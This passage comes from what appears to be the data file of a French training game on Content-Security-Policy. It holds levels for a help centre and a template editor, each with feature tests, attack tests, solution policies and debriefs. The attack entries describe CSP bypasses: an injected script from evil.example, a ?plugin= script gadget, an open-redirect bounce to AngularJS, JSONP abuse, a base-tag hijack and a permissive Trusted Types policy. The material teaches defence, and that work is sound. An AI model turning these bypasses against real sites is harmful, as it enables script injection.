    { id: 'h-js', kind: 'feature', label: 'Script du centre d’aide', detail: '<script src="/static/aide.js">', action: { kind: 'script', url: `${AIDE}/static/aide.js` } },
    { id: 'h-fuse', kind: 'feature', label: 'Bibliothèque de recherche', detail: '<script src="https://cdn.public.example/libs/fuse.js/7.0.0/fuse.min.js">', action: { kind: 'script', url: 'https://cdn.public.example/libs/fuse.js/7.0.0/fuse.min.js' } },
    { id: 'h-config', kind: 'feature', label: 'Configuration inline', detail: '<script>window.AIDE = {…}</script>, empreinte SHA-256 connue', action: { kind: 'script', hash: HASH } },
    { id: 'h-search', kind: 'feature', label: 'Recherche', detail: 'fetch vers https://api.novafact.example/v1/help/search', action: { kind: 'fetch', directive: 'connect-src', url: 'https://api.novafact.example/v1/help/search' } },
    { id: 'h-css', kind: 'feature', label: 'Feuille de style', detail: '/static/aide.css', action: { kind: 'style', url: `${AIDE}/static/aide.css` } },
    { id: 'h-img', kind: 'feature', label: 'Captures d’écran', detail: '/img/…', action: { kind: 'fetch', directive: 'img-src', url: `${AIDE}/img/export.png` } },
    { id: 'h-a-inline', kind: 'attack', label: 'Script inline dans un commentaire', detail: '<script> dans un commentaire de lecteur', action: { kind: 'script' } },
    { id: 'h-a-angular', kind: 'attack', label: 'AngularJS depuis le même CDN', detail: `<script src="${ANGULAR}"> puis un gabarit ng-app dans le commentaire`, action: { kind: 'script', url: ANGULAR } },
    { id: 'h-a-redirect', kind: 'attack', label: 'Rebond par /sortie', detail: `<script src="/sortie?url=${ANGULAR}">`, action: { kind: 'script', url: `${AIDE}/sortie?url=${encodeURIComponent(ANGULAR)}`, redirectTo: ANGULAR } },
    { id: 'h-a-jsonp', kind: 'attack', label: 'JSONP de l’API', detail: '<script src="https://api.novafact.example/v1/legacy/suggest?callback=…">', action: { kind: 'script', url: 'https://api.novafact.example/v1/legacy/suggest?callback=x' } },
    { id: 'h-a-takeover', kind: 'attack', label: 'Sous-domaine repris', detail: 'fetch vers promo-2021.novafact.example, un bucket supprimé dont le nom a été repris', action: { kind: 'fetch', directive: 'connect-src', url: 'https://promo-2021.novafact.example/c' } },
  ],
  solution: {
    'default-src': ["'self'"],
    'script-src': ['https://aide.novafact.example/static/', 'https://cdn.public.example/libs/fuse.js/7.0.0/fuse.min.js', HASH],
    'connect-src': ["'self'", 'https://api.novafact.example'],
  },
  hint: 'Pas de nonce possible ici. Un chemin exact protège le premier saut d’une requête, pas la suite : après une redirection, seul l’hôte est comparé. Qui, dans ta liste, accepte encore /sortie ?',
  debrief: 'La politique la plus serrée possible sans nonce : des chemins, une empreinte, et aucune origine entière. Le CDN public autorisé en entier sert aussi AngularJS, dont le mode CSP exécute du code sans eval à partir d’un simple gabarit injecté. Le chemin exact de Fuse.js ferme cette porte… jusqu’à ce qu’une redirection s’en mêle : la spécification ignore le chemin après une redirection, pour ne pas révéler où mènent les redirections d’autres origines. Avec \'self\', /sortie est accepté au premier saut, et le rebond vers AngularJS passe au second, puisque cdn.public.example y est autorisé. Restreindre \'self\' à /static/ ferme ce premier saut. \'strict-dynamic\' est le piège inverse : sans nonce, il ignore toute la liste et casse la page. La vraie correction est ailleurs : supprimer la redirection ouverte, échapper les commentaires, et générer un nonce à la périphérie (fonction CloudFront ou Lambda@Edge) pour passer à une politique stricte.',
  realCase: 'Le CSP Evaluator de Google signale les hôtes connus pour servir AngularJS ou du JSONP ; Gareth Heyes (PortSwigger, 2019) a publié un contournement de CSP par AngularJS en 56 caractères. Le comportement « chemin ignoré après redirection » est documenté dans la spécification CSP (section Paths and Redirects), qui cite les travaux d’Egor Homakov (« Using Content-Security-Policy for Evil », 2014).',
};

// ── N3 · L'éditeur de modèles ───────────────────────────────────────────────

const editeur: CspPage = {
  id: 'editeur',
  level: 3,
  title: 'L’éditeur de modèles',
  origin: SELF,
  context: 'Un éditeur où les clients composent leurs modèles de facture en HTML. La politique stricte de la page de paiement a été reprise : nonce, \'strict-dynamic\', base-uri, object-src. Le bundle charge ses morceaux à la demande ; un module de signature électronique charge ses scripts depuis le CDN régional de son éditeur, dont le domaine varie. Le code crée des politiques Trusted Types : « novafact » (application), « dompurify » (nettoyage de l’aperçu), « sign » (module de signature). Un audit a trouvé deux défauts : un ancien aperçu qui écrit le HTML brut dans innerHTML, et un paramètre ?plugin= que le chargeur transforme en <script src>.',
  directiveChoices: [
    { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'"] },
    { d: 'script-src', hint: 'Qui peut exécuter du JavaScript', tokens: ["'self'", NONCE, "'strict-dynamic'", "'unsafe-eval'", 'https://sign.partner.example', 'https:'] },
    { d: 'object-src', hint: 'Plugins (object, embed)', tokens: ["'none'"] },
    { d: 'base-uri', hint: 'Balise <base>', tokens: ["'none'", "'self'"] },
    { d: 'frame-ancestors', hint: 'Qui peut intégrer cette page', tokens: ["'none'", "'self'"] },
    { d: 'require-trusted-types-for', hint: 'Les sinks DOM refusent les chaînes brutes', tokens: ["'script'"] },
    { d: 'trusted-types', hint: 'Noms de politiques Trusted Types autorisés', tokens: ['novafact', 'dompurify', 'sign', '*'] },
  ],
  initialPolicy: {
    'default-src': ["'self'"],
    'script-src': [NONCE, "'strict-dynamic'"],
    'object-src': ["'none'"],
    'base-uri': ["'none'"],
    'frame-ancestors': ["'none'"],
  },
  cspTests: [
    { id: 't-bundle', kind: 'feature', label: 'Bundle de l’éditeur', detail: '<script nonce src="/assets/editor.js">', action: { kind: 'script', url: `${SELF}/assets/editor.js`, nonce: true } },
    { id: 't-chunks', kind: 'feature', label: 'Morceaux chargés à la demande', detail: 'Le bundle insère /assets/editor-[hash].js, URL passée par sa politique « novafact »', action: { kind: 'script', url: `${SELF}/assets/editor-8c1d.js`, dynamic: true } },
    { id: 't-sign', kind: 'feature', label: 'Chargeur de signature', detail: '<script nonce src="https://sign.partner.example/loader.js">', action: { kind: 'script', url: 'https://sign.partner.example/loader.js', nonce: true } },
    { id: 't-sign-cdn', kind: 'feature', label: 'Scripts de signature', detail: 'Insérés par le chargeur depuis https://eu3.cdn-sign.example (le domaine varie selon la région)', action: { kind: 'script', url: 'https://eu3.cdn-sign.example/sign.js', dynamic: true } },
    { id: 't-tt-app', kind: 'feature', label: 'Politique « novafact »', detail: 'trustedTypes.createPolicy("novafact", …)', action: { kind: 'tt-policy', name: 'novafact' } },
    { id: 't-tt-purify', kind: 'feature', label: 'Politique « dompurify »', detail: 'Créée par DOMPurify pour renvoyer du TrustedHTML', action: { kind: 'tt-policy', name: 'dompurify' } },
    { id: 't-tt-sign', kind: 'feature', label: 'Politique « sign »', detail: 'Créée par le module de signature', action: { kind: 'tt-policy', name: 'sign' } },
    { id: 't-api', kind: 'feature', label: 'Appels à l’API', detail: 'fetch vers la même origine', action: { kind: 'fetch', directive: 'connect-src', url: `${SELF}/api/templates` } },
    { id: 't-a-inline', kind: 'attack', label: 'Script inline injecté', detail: '<script> dans un modèle', action: { kind: 'script' } },
    { id: 't-a-ext', kind: 'attack', label: 'Script externe injecté', detail: '<script src="https://evil.example/x.js"> dans un modèle', action: { kind: 'script', url: `${EVIL}/x.js` } },
    { id: 't-a-sink', kind: 'attack', label: 'Ancien aperçu', detail: 'apercu.innerHTML = modele.html, une chaîne brute', action: { kind: 'sink' } },
    { id: 't-a-gadget', kind: 'attack', label: 'Paramètre ?plugin=', detail: 's.src = params.get("plugin"); document.head.append(s), avec ?plugin=https://evil.example/x.js', action: { kind: 'script', url: `${EVIL}/x.js`, dynamic: true, viaStringSink: true } },
    { id: 't-a-eval', kind: 'attack', label: 'Formule évaluée', detail: 'Un greffon passe la formule d’un modèle à new Function()', action: { kind: 'eval' } },
    { id: 't-a-policy', kind: 'attack', label: 'Politique de contournement', detail: 'Une dépendance mise à jour crée createPolicy("passthrough", { createHTML: (s) => s })', action: { kind: 'tt-policy', name: 'passthrough' } },
    { id: 't-a-base', kind: 'attack', label: 'Balise <base> injectée', detail: 'Détourne /assets/editor.js, qui porte le nonce', action: { kind: 'base', url: `${EVIL}/` } },
    { id: 't-a-frame', kind: 'attack', label: 'Clickjacking', detail: 'L’éditeur intégré par evil.example', action: { kind: 'framed-by', origin: EVIL } },
  ],
  solution: {
    'default-src': ["'self'"],
    'script-src': [NONCE, "'strict-dynamic'"],
    'object-src': ["'none'"],
    'base-uri': ["'none'"],
    'frame-ancestors': ["'none'"],
    'require-trusted-types-for': ["'script'"],
    'trusted-types': ['novafact', 'dompurify', 'sign'],
  },
  hint: '\'strict-dynamic\' fait confiance à tout script qu’un script de confiance insère — y compris quand l’URL vient de l’attaquant. Retirer \'strict-dynamic\' casse la signature ; il faut contrôler l’URL au moment où elle entre dans script.src.',
  debrief: 'La politique de départ passe presque tout, et c’est le piège : ses défauts sont des absences. \'strict-dynamic\' propage la confiance du bundle à ce qu’il insère ; quand le chargeur fabrique un <script> à partir de ?plugin=, le navigateur n’a aucune raison de le refuser. Revenir à une liste d’hôtes casserait la signature, dont le domaine varie. require-trusted-types-for \'script\' déplace le contrôle dans le sink : script.src, innerHTML et eval refusent désormais les chaînes brutes, et seules les valeurs issues d’une politique passent. trusted-types borne ensuite la liste des politiques : sans elle, la dépendance qui crée « passthrough » rouvre tous les sinks ; avec *, aussi. Nommer novafact, dompurify et sign fait de chaque nouvelle politique une décision relue.',
  realCase: 'Lekies, Kotowicz et Vela Nava (Google), « Don’t Trust the DOM: Bypassing XSS Mitigations via Script Gadgets », Black Hat USA 2017 : des chaînes de gadgets dans 16 bibliothèques populaires contournaient les CSP, \'strict-dynamic\' compris, en faisant exécuter par du code légitime ce que l’attaquant avait écrit dans le DOM. Trusted Types, proposé ensuite par Google au W3C, contrôle ces sinks au lieu de l’origine des scripts.',
};

// ── Le pool et les séries ───────────────────────────────────────────────────

export const cspPages: CspPage[] = [vitrine, tableauDeBord, backOffice, integration, paiement, centreAide, editeur];

const PROFILES: SeriesProfile<CspPage>[] = [
  { id: 'vitrine', title: 'Le site vitrine', ids: ['vitrine'],
    text: 'Une page statique, aucune CSP. Chaque attaque se ferme par une directive, et trois d’entre elles n’ont pas de repli sur default-src.' },
  { id: 'tableau-de-bord', title: 'Le tableau de bord', ids: ['tableau-de-bord'],
    text: 'Une SPA et son API sur un autre sous-domaine. On découvre qu’une directive remplace default-src et que * ne couvre pas blob:.' },
  { id: 'back-office', title: 'Le back-office du support', ids: ['back-office'],
    text: 'Nonce, widget tiers sans nonce et attributs style : le nonce fait ignorer \'unsafe-inline\', et \'self\' laisse s’exécuter les pièces jointes.' },
  { id: 'integration', title: 'Le module intégré', ids: ['integration'],
    text: 'Tout se joue dans frame-ancestors : \'self\' qui n’est pas l’application, un joker qui ne couvre pas le domaine nu, un domaine racheté.' },
  { id: 'paiement', title: 'La page de paiement', ids: ['paiement'],
    text: 'Un gestionnaire de balises qui injecte ses scripts : les listes de domaines laissent passer JSONP et CDN, il faut nonce et \'strict-dynamic\'.' },
  { id: 'centre-aide', title: 'Le centre d’aide', ids: ['centre-aide'],
    text: 'Un site statique, donc pas de nonce. Chemins exacts et empreinte, mais une redirection ouverte efface les chemins au second saut.' },
  { id: 'editeur', title: 'L’éditeur de modèles', ids: ['editeur'],
    text: 'La politique stricte est déjà là et passe presque tout. Ce qui manque est une absence : \'strict-dynamic\' propage aussi l’URL de l’attaquant.' },
];

export const cspSeries = defineSeries(cspPages, PROFILES);

// Compatibilité : la page historique du jeu.
export const directiveChoices = paiement.directiveChoices;
export const initialPolicy = paiement.initialPolicy;
export const cspTests = paiement.cspTests;
